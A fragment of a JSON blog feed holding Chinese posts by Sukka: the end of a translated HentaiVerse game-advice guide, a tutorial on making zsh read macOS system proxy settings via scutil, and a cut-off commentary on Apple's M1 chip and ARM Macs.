Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 